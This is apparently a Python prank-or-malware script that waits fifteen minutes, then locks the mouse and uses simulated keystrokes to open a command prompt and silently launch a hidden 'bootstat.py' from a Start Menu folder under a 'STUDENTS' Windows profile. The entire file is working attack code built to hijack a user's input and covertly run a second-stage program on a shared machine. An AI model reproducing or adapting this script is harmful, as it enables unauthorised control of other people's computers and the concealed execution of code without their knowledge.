 

from pynput.keyboard import Controller, Key
from concurrent.futures import thread
import keyboard as keyboard_
import time
from ctypes import *
import threading
import mouse

time.sleep(900)
# time.sleep(10)cmd
def blockmouse():    
    blocker_flag = 0              
    while True:
        mouse.move(0,0)
        blocker_flag=blocker_flag+1
        if blocker_flag == 300:
            break
def payload():
    keyboard = Controller()
    with keyboard.pressed(Key.cmd_l):
        keyboard.press("r")
    time.sleep(0.5)
    keyboard.type("cmd")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(0.5)
    # keyboard.type(r"cd C:\\Users\STUDENTS\\3D Objects\src\\touch")
    keyboard.type(r"cd C:\\Users\STUDENTS\AppData\\Roaming\\Microsoft\Windows\Start Menu\\Programs\\Python 3.10\\")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(0.5)
    keyboard.type("pythonw bootstat.py")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(0.5)
    keyboard.type("exit")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(0.5)
    
t2=threading.Thread(target=blockmouse)
t3=threading.Thread(target=payload)

t2.start()
t3.start()
